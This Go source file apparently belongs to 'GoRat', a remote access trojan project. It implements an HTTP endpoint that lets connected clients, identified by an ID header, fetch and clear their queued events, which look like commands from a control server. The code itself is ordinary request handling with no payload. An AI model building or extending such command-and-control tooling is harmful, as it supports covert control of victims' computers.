package endpoints

import (
	"encoding/json"
	"net/http"

	"github.com/NotKatsu/GoRat/modules/database"

	"github.com/pterm/pterm"
)

func EventsGet(w http.ResponseWriter, r *http.Request) {
	if r.Method == "GET" {
		customID := r.Header.Get("ID")

		if customID == "" || database.GetConnectionData(customID) == "" {
			invalidIDError := Error{
				ErrorCode:    http.StatusUnauthorized,
				ErrorMessage: "Data could not be retrived as ID is not valid.",
			}
			w.WriteHeader(http.StatusUnauthorized)

			invalidIDErrorJson, err := json.Marshal(invalidIDError)

			if err != nil {
				pterm.Fatal.WithFatal(true).Println(err)
			} else {
				_, err := w.Write(invalidIDErrorJson)

				if err != nil {
					pterm.Fatal.WithFatal(true).Println(err)
				}
			}
		} else {
			EventFound := database.GetClientEvent(customID)

			if EventFound.Recipient == "None" || EventFound.Recipient == "" {
				ErrorReturnStruct := Error{
					ErrorCode:    http.StatusForbidden,
					ErrorMessage: "There is no events for the client, please try again later.",
				}
				w.WriteHeader(http.StatusForbidden)

				ErrorReturnStructMarshal, err := json.Marshal(ErrorReturnStruct)

				if err != nil {
					pterm.Fatal.WithFatal(true).Println(err)
				} else {
					_, err := w.Write(ErrorReturnStructMarshal)

					if err != nil {
						pterm.Fatal.WithFatal(true).Println(err)
					}
				}
			} else {
				EventFoundReturnStruct := EventFoundReturn{
					Recipient: EventFound.Recipient,
					EventType: EventFound.EventType,
					Extra:     EventFound.Extra,
				}
				w.WriteHeader(http.StatusOK)

				EventFoundReturnStructMarshal, err := json.Marshal(EventFoundReturnStruct)

				database.DeleteClientEvent(EventFound.Recipient, EventFound.EventType, EventFound.Extra)

				if err != nil {
					pterm.Fatal.WithFatal(true).Println(err)
				} else {
					_, err := w.Write(EventFoundReturnStructMarshal)

					if err != nil {
						pterm.Fatal.WithFatal(true).Println(err)
					}
				}
			}
		}

	} else {
		wrongMethodError := Error{
			ErrorCode:    http.StatusMethodNotAllowed,
			ErrorMessage: "GET is the only accepted Method for this endpoint.",
		}
		w.WriteHeader(http.StatusMethodNotAllowed)

		wrongMethodErrorJson, err := json.Marshal(wrongMethodError)

		if err != nil {
			pterm.Fatal.WithFatal(true).Println(err)
		} else {
			_, err := w.Write(wrongMethodErrorJson)

			if err != nil {
				pterm.Fatal.WithFatal(true).Println(err)
			}
		}
	}
}
